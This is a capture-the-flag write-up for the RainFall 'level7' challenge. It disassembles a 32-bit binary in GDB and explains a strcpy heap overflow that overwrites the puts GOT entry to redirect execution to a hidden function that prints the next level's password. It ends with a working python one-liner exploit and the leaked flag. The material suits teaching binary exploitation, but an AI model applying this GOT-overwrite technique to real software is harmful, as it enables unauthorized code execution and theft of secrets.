# level7

> We use [GDB peda](https://github.com/longld/peda) in order to get a better GDB visualization.

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

```gdb
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048521 <+0>:      push   ebp
   0x08048522 <+1>:      mov    ebp,esp
   0x08048524 <+3>:      and    esp,0xfffffff0
   0x08048527 <+6>:      sub    esp,0x20                        ; 32 bytes of stack space
   0x0804852a <+9>:      mov    DWORD PTR [esp],0x8             ; load 1st malloc arg (8)
   0x08048531 <+16>:     call   0x80483f0 <malloc@plt>          ; malloc(8)
   0x08048536 <+21>:     mov    DWORD PTR [esp+0x1c],eax        ; struct1 = malloc return value (0x804a008)
   0x0804853a <+25>:     mov    eax,DWORD PTR [esp+0x1c]        ; eax = struct1
   0x0804853e <+29>:     mov    DWORD PTR [eax],0x1             ; 1st variable of struct1 (int) = 1
   0x08048544 <+35>:     mov    DWORD PTR [esp],0x8             ; load 1st malloc arg (8)
   0x0804854b <+42>:     call   0x80483f0 <malloc@plt>          ; malloc(8)
   0x08048550 <+47>:     mov    edx,eax                         ; edx = malloc return value (0x0804a018)
   0x08048552 <+49>:     mov    eax,DWORD PTR [esp+0x1c]        ; eax = struct1
   0x08048556 <+53>:     mov    DWORD PTR [eax+0x4],edx         ; 2nd variable of struct1 = 0x0804a018
   0x08048559 <+56>:     mov    DWORD PTR [esp],0x8             ; load 1st malloc arg (8)
   0x08048560 <+63>:     call   0x80483f0 <malloc@plt>          ; malloc(8)
   0x08048565 <+68>:     mov    DWORD PTR [esp+0x18],eax        ; struct2 = malloc return value (0x804a028)
   0x08048569 <+72>:     mov    eax,DWORD PTR [esp+0x18]        ; eax = struct2
   0x0804856d <+76>:     mov    DWORD PTR [eax],0x2             ; 1st variable of struct2 (int) = 2
   0x08048573 <+82>:     mov    DWORD PTR [esp],0x8             ; load 1st malloc arg (8)
   0x0804857a <+89>:     call   0x80483f0 <malloc@plt>          ; malloc(8)
   0x0804857f <+94>:     mov    edx,eax                         ; edx = malloc return value (0x0804a038)
   0x08048581 <+96>:     mov    eax,DWORD PTR [esp+0x18]        ; eax = struct2
   0x08048585 <+100>:    mov    DWORD PTR [eax+0x4],edx         ; 2nd variable of struct2 = 0x0804a038
   0x08048588 <+103>:    mov    eax,DWORD PTR [ebp+0xc]         ; eax = argv
   0x0804858b <+106>:    add    eax,0x4                         ; eax += 4 (argv[1] offset)
   0x0804858e <+109>:    mov    eax,DWORD PTR [eax]             ; eax = argv[1]
   0x08048590 <+111>:    mov    edx,eax                         ; edx = argv[1]
   0x08048592 <+113>:    mov    eax,DWORD PTR [esp+0x1c]        ; eax = struct1
   0x08048596 <+117>:    mov    eax,DWORD PTR [eax+0x4]         ; eax = 2nd variable of struct1
   0x08048599 <+120>:    mov    DWORD PTR [esp+0x4],edx         ; load 2nd strcpy arg (argv[1])
   0x0804859d <+124>:    mov    DWORD PTR [esp],eax             ; load 1st arg of strcpy (2nd var of struct1)
   0x080485a0 <+127>:    call   0x80483e0 <strcpy@plt>          ; strcpy(2nd var of struct1, argv[1])
   0x080485a5 <+132>:    mov    eax,DWORD PTR [ebp+0xc]         ; eax = argv
   0x080485a8 <+135>:    add    eax,0x8                         ; eax += 8 (argv[2] offset)
   0x080485ab <+138>:    mov    eax,DWORD PTR [eax]             ; eax = argv[2]
   0x080485ad <+140>:    mov    edx,eax                         ; edx = argv[2]
   0x080485af <+142>:    mov    eax,DWORD PTR [esp+0x18]        ; eax = struct2
   0x080485b3 <+146>:    mov    eax,DWORD PTR [eax+0x4]         ; eax = 2nd var of struct2
   0x080485b6 <+149>:    mov    DWORD PTR [esp+0x4],edx         ; load 2nd strcpy arg (argv[2]) to stack
   0x080485ba <+153>:    mov    DWORD PTR [esp],eax             ; load 1st strcpy arg (2nd var of struct2) to stack
   0x080485bd <+156>:    call   0x80483e0 <strcpy@plt>          ; strcpy(2nd var of struct2, argv[2])
   0x080485c2 <+161>:    mov    edx,0x80486e9                   ; edx = 0x80486e9 (contains "r")
   0x080485c7 <+166>:    mov    eax,0x80486eb                   ; eax = 0x80486eb (contains "/home/user/level8/.pass")
   0x080485cc <+171>:    mov    DWORD PTR [esp+0x4],edx         ; load 2nd fopen arg to stack
   0x080485d0 <+175>:    mov    DWORD PTR [esp],eax             ; load 1st fopen arg to stack
   0x080485d3 <+178>:    call   0x8048430 <fopen@plt>           ; fopen("/home/user/level8/.pass", "r")
   0x080485d8 <+183>:    mov    DWORD PTR [esp+0x8],eax         ; load 3rd fgets arg to stack (fopen return value)
   0x080485dc <+187>:    mov    DWORD PTR [esp+0x4],0x44        ; load 2nd fgets arg (68)
   0x080485e4 <+195>:    mov    DWORD PTR [esp],0x8049960       ; load 1st fgets arg (.bss buffer)
   0x080485eb <+202>:    call   0x80483c0 <fgets@plt>           ; fgets(buffer, 68, filestream)
   0x080485f0 <+207>:    mov    DWORD PTR [esp],0x8048703       ; load puts arg ("~~")
   0x080485f7 <+214>:    call   0x8048400 <puts@plt>            ; puts("~~")
   0x080485fc <+219>:    mov    eax,0x0
   0x08048601 <+224>:    leave
   0x08048602 <+225>:    ret
End of assembler dump.
```

```gdb
gdb-peda$ disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   ebp
   0x080484f5 <+1>:     mov    ebp,esp
   0x080484f7 <+3>:     sub    esp,0x18
   0x080484fa <+6>:     mov    DWORD PTR [esp],0x0              ; load time arg (NULL)
   0x08048501 <+13>:    call   0x80483d0 <time@plt>             ; time(NULL)
   0x08048506 <+18>:    mov    edx,0x80486e0                    ; 0x80486e0 contains "%s - %d\n"
   0x0804850b <+23>:    mov    DWORD PTR [esp+0x8],eax          ; load 3rd printf arg to stack (time return value)
   0x0804850f <+27>:    mov    DWORD PTR [esp+0x4],0x8049960    ; load printf 2nd arg to stack
   0x08048517 <+35>:    mov    DWORD PTR [esp],edx              ; load 1st printf arg to stack
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>           ; printf("%s - %d\n", .bss buffer, time return value)
   0x0804851f <+43>:    leave
   0x08048520 <+44>:    ret
End of assembler dump.
```

Once again in this level, `objdump` helps us to find a hidden function, `m`, which prints the content of a buffer declared in the bss section (out of the functions scope). This buffer is filled with a call to `fgets` on the content of the .pass file which contains the flag.

After a deep analysis of the `main`, we undertsand that it uses `malloc` to allocate space for two structures + one element of each one that looks like a string pointer. This is confirmed by the later calls to `strcpy`, used to copy argv[1] and argv[2] to these two addresses.

Now we have some clues to investigate on; we can use `strcpy` vulnerability to create an overflow and write some code on the heap. Actually, if we supply a long enough string to argv[1], we can erase the content of the second struct allocated, since the addresses will be contiguous on the heap memory.

We also know that we can overwrite the content of an address listed the Global Offset Table (referring to a shared library function address) to make it point to another address. Let's take a look.

```console
level7@RainFall:~$ objdump -TR ./level7

./level7:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000      DF *UND*	00000000  GLIBC_2.0   printf
00000000      DF *UND*	00000000  GLIBC_2.0   fgets
00000000      DF *UND*	00000000  GLIBC_2.0   time
00000000      DF *UND*	00000000  GLIBC_2.0   strcpy
00000000      DF *UND*	00000000  GLIBC_2.0   malloc
00000000      DF *UND*	00000000  GLIBC_2.0   puts
00000000  w   D  *UND*	00000000              __gmon_start__
00000000      DF *UND*	00000000  GLIBC_2.0   __libc_start_main
00000000      DF *UND*	00000000  GLIBC_2.1   fopen
080486dc g    DO .rodata	00000004  Base        _IO_stdin_used


DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen
```

The dynamic relocation of the function `puts`, which is called right after `strcpy` in the program, is located at the address `0x08049928`; here is our entry point to redirect the execution flow to the function `m` located at `0x080484f4`.

## Exploit

In order to overwrite the address pointed by `puts` in the GOT, we will use the address returned by the last `malloc` call. To do so, we first overwrite this address with the `puts` one (from GOT). This is done with an overflow attack performed on the first `strcpy`. Then, we use the second copy to write the content of argv[2] (we put `m` address in it) to this (altered) address.

Let's run the program in GDB with easily recognisable arguments ("AAAAAAAA" and "BBBBBBBB") and take a look at the heap :

```gdb
gdb-peda$ x/32 0x804a000                                    # heap starting address, found with 'info proc mappings' command in GDB
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018  # first struct int + char*
0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141  # 'A' characters string
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038  # second struct int + char*
0x804a030:	0x00000000	0x00000011	0x42424242	0x42424242  # 'B' characters string
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000000	0x00000000	0x00000000	0x00000000
```

Here we see the allocation addresses of the structures, containing an integer (0x00000001/2), then a pointer to the address of the string (0x0804a018/38) stored after 8 bytes of metadata (0x00000000	0x00000011). So, what we need to do is to write 20 characters + the `puts` relocation address to overwrite the string pointer address of the second struct (0x0804a038), then write the address of `m` to it. Here we go ! 

```console
level7@RainFall:~$ ./level7 `python -c 'print "A"*20 + "\x28\x99\x04\x08" + " " + "\xf4\x84\x04\x08"'`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1524764276
```